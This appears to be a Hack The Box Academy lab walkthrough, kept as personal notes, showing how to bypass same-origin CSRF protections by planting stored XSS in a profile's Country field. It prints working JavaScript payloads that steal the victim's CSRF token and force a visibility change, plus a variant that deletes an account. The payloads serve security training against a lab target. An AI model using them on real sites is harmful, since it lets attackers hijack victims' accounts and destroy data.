Sometimes, even if we manage to bypass CSRF protections, we may not be able to create cross-site requests due to some sort of same origin/same site restriction. If this is the case, we can try chaining vulnerabilities to get the end result of CSRF.

Let us provide you with a practical example.

Proceed to the end of this section and click onÂ `Click here to spawn the target system!`Â or theÂ `Reset Target`Â icon. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target application and follow along. Don't forget to configure the specified vhost (`minilab.htb.net`) to access the application.

Navigate toÂ `http://minilab.htb.net`Â and log in to the application using the credentials below:

- Email: crazygorilla983
- Password: pisces

This is an account that we created to look at the application's functionality.

Some facts about the application:

- The application features same origin/same site protections as anti-CSRF measures (through a server configuration - you won't be able to actually spot it)
- The application'sÂ _Country_Â field is vulnerable to stored XSS attacks (like we saw in theÂ _Cross-Site Scripting (XSS)_Â section)

Malicious cross-site requests are out of the equation due to the same origin/same site protections. We can still perform a CSRF attack through the stored XSS vulnerability that exists. Specifically, we will leverage the stored XSS vulnerability to issue a state-changing request against the web application. A request through XSS will bypass any same origin/same site protection since it will derive from the same domain!

Now it is time to develop the appropriate JavaScript payload to place within theÂ _Country_Â field of Ela Stienen's profile.

Let us target theÂ _Change Visibility_Â request because a successful CSRF attack targetingÂ _Change Visibility_Â can cause the disclosure of a private profile.

First, we need to intercept the related request.

Run Burp Suite as follows.


```shell-session
smoothment@htb[/htb]$ burpsuite
```

By browsing the application, we notice that Ela Stienen can't share her profile. This is because her profile isÂ _private_. Let us change that by clicking "Change Visibility."

Then, activate Burp Suite's proxy (_Intercept On_) and configure your browser to go through it. Now clickÂ _Make Public!_.

![image](https://academy.hackthebox.com/storage/modules/153/45.png)

You should see the below inside Burp Suite's proxy.

![image](https://academy.hackthebox.com/storage/modules/153/56.png)

Forward all requests so that Ela Stienen's profile becomes public.

Let us focus on the payload we should specify in theÂ _Country_Â field of Ela Stienen's profile to successfully execute a CSRF attack that will change the victim's visibility settings (From private to public and vice versa).

The payload we should specify can be seen below.

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/change-visibility',true);
req.send();
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
};
</script>
```

Let us break things down for you.

Firstly we put the entire script inÂ `<script>`Â tags, so it gets executed as valid JavaScript; otherwise, it will be rendered as text.


```javascript
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/change-visibility',true);
req.send();
```

The script snippet above creates an ObjectVariable calledÂ _req_, which we will be using to generate a request.Â _var req = new XMLHttpRequest();_Â is allowing us to get ready to send HTTP requests.


```javascript
req.onload = handleResponse;
```

In the script snippet above, we see theÂ _onload_Â event handler, which will perform an action once the page has been loaded. This action will be related to theÂ _handleResponse_Â function that we will define later.


```javascript
req.open('get','/app/change-visibility',true);
```

In the script snippet above, we pass three arguments.Â _get_Â which is the request method, the targeted pathÂ _/app/change-visibility_Â and thenÂ _true_Â which will continue the execution.


```javascript
req.send();
```

The script snippet above will send everything we constructed in the HTTP request.


```javascript
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
};
```

The script snippet above defines a function calledÂ _handleResponse_.


```javascript
var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
```

The script snippet above defines a variable calledÂ _token_, which gets the value ofÂ _responseText_Â from the page we specified earlier in our request.Â `/name="csrf" type="hidden" value="(\w+)"/)[1];`Â looks for a hidden input field calledÂ _csrf_Â and \w+ matches one or more alphanumeric characters. In some cases, this may be different, so let us look at how you can identify the name of a hidden value or check if it is actually "CSRF".

Open Web Developer Tools (Shift+Ctrl+I in the case of Firefox) and navigate to theÂ _Inspector_Â tab. We can use theÂ _search_Â functionality to look for a specific string. In our case, we look forÂ _csrf_, and we get a result.

![image](https://academy.hackthebox.com/storage/modules/153/57.png)

**Note**: If no result is returned and you are certain that CSRF tokens are in place, look through various bits of the source code or copy your current CSRF token and look for it through the search functionality. This way, you may uncover the input field name you are looking for. If you still get no results, this doesn't mean that the application employs no anti-CSRF protections. There could be another form that is protected by an anti-CSRF protection.

```javascript
var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
```

The script snippet above constructs the HTTP request that we will send through aÂ [XMLHttpRequest](https://blog.0daylabs.com/2014/09/13/ajax-everything-you-should-know-about-xmlhttprequest/)Â object.

```javascript
changeReq.open('post', '/app/change-visibility', true);
```

In the script snippet above, we change the method from GET to POST. The first request was to move us to the targeted page and the second request was to perform the wanted action.


```javascript
changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
```

The script snippet above is setting the Content-Type toÂ _application/x-www-form-urlencoded_.

```javascript
changeReq.send('csrf='+token+'&action=change');
```

The script snippet above sends the request with one param calledÂ _csrf_Â having the value of theÂ _token_Â variable, which is essentially the victim's CSRF token, and another parameter calledÂ _action_Â with the valueÂ _change_. These are the two parameters that we noticed while inspecting the targeted request through Burp.

![image](https://academy.hackthebox.com/storage/modules/153/56.png)

Let us try to make a victim's profile public.

First, submit the full payload to theÂ _Country_Â field of Ela Stienen's profile and click "Save".

![image](https://academy.hackthebox.com/storage/modules/153/44.png)

Open aÂ `New Private Window`, navigate toÂ `http://minilab.htb.net`Â again and log in to the application using the credentials below:

- Email: goldenpeacock467
- Password: topcat

This is a user that has its profile "private." No "Share" functionality exists.

![image](https://academy.hackthebox.com/storage/modules/153/58.png)

Open a new tab and browse Ela Stienen's public profile by navigating to the link below.

`http://minilab.htb.net/profile?email=ela.stienen@example.com`

This is what the victim will come across.

![image](https://academy.hackthebox.com/storage/modules/153/46.png)

Now, if you go back to the victim's usual profile page and refresh/reload the page, you should see that his profile became "public" (notice the "Share" button that appeared).

![image](https://academy.hackthebox.com/storage/modules/153/59.png)

You just executed a CSRF attack through XSS, bypassing the same origin/same site protections in place!

**Extra practice**: Adapt the XSS payload above to delete @goldenpeacock467's account through CSRF.

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/delete/mhmdth.rdyy@example.com',true);
req.send();
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/delete', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token);
};
</script>
```

---

The following section will focus on identifying and bypassing weak CSRF tokens to execute CSRF attacks.

# Question
---

![Pasted image 20250219130520.png](../../../../IMAGES/Pasted%20image%2020250219130520.png)

